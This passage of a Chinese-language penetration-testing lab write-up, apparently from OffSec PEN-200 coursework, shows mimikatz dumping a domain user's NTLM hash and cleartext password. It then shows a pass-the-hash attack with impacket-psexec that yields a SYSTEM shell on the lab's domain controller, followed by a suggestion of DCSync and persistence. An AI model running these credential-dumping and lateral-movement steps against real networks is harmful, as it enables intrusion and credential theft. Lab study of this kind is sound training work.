+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  ...
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+...
+Authentication Id : 0 ; 253683 (00000000:0003def3)
+Session           : Interactive from 1
+User Name         : beccy
+Domain            : BEYOND
+Logon Server      : DCSRV1
+Logon Time        : 3/8/2023 4:50:32 AM
+SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
+        msv :
+         [00000003] Primary
+         * Username : beccy
+         * Domain   : BEYOND
+         * NTLM     : f0397ec5af49971f6efbdb07877046b3
+         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
+         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
+        tspkg :
+        wdigest :
+         * Username : beccy
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : beccy
+         * Domain   : BEYOND.COM
+         * Password : NiftyTopekaDevolve6655!#!
+...
+```
+> beccy:
+> - NTLM Hash `f0397ec5af49971f6efbdb07877046b3`
+> - 明文密碼 `NiftyTopekaDevolve6655!#!`
+
+#### 3. 存儲憑證，入侵 DCSRV1
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat creds.txt
+...
+beccy:NiftyTopekaDevolve6655!#!
+beccy NTLM Hash: f0397ec5af49971f6efbdb07877046b3
+```
+### Lateral Movement
+使用 beccy 的 NTLM Hash 透過 `impacket-psexec` 取得 DCSRV1 的控制權
+> 透過 Pass-the-Hash (PTH) 攻擊，使用 impacket-psexec 取得 DCSRV1 的 SYSTEM 權限
+
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.73.240
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.73.240.....
+[*] Found writable share ADMIN$
+[*] Uploading file CGOrpfCz.exe
+[*] Opening SVCManager on 172.16.73.240.....
+[*] Creating service tahE on 172.16.73.240.....
+[*] Starting service tahE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1006]
+(c) Microsoft Corporation. All rights reserved.
+
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+DCSRV1
+
+C:\Windows\system32> ipconfig
+ 
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 172.16.73.240
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.73.254
+```
+>[!Important]
+>成功控制 BEYOND.COM 網域\
+>💡 接下來可以執行 `DCSync` 或 `Mimikatz` 來擷取完整的網域密碼雜湊，建立 Persistence
+
+## Report
+- [Penetration_Testing_Report.pdf](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/misc/assembling_the_pieces/daeebbc40a5cfbb70d96f6b10104b453-assemble_flag.pdf)
+
+
+>[!Caution]
+>Offsec:\
+>"**Don't give up, and remember the Try Harder -mindset!**"\
+>([𝄞 BGM 🎵](https://youtu.be/t-bgRQfeW64?si=vW85In80qfVBfStn))\
+>![image](https://hackmd.io/_uploads/By6nJpvhJx.png)
+
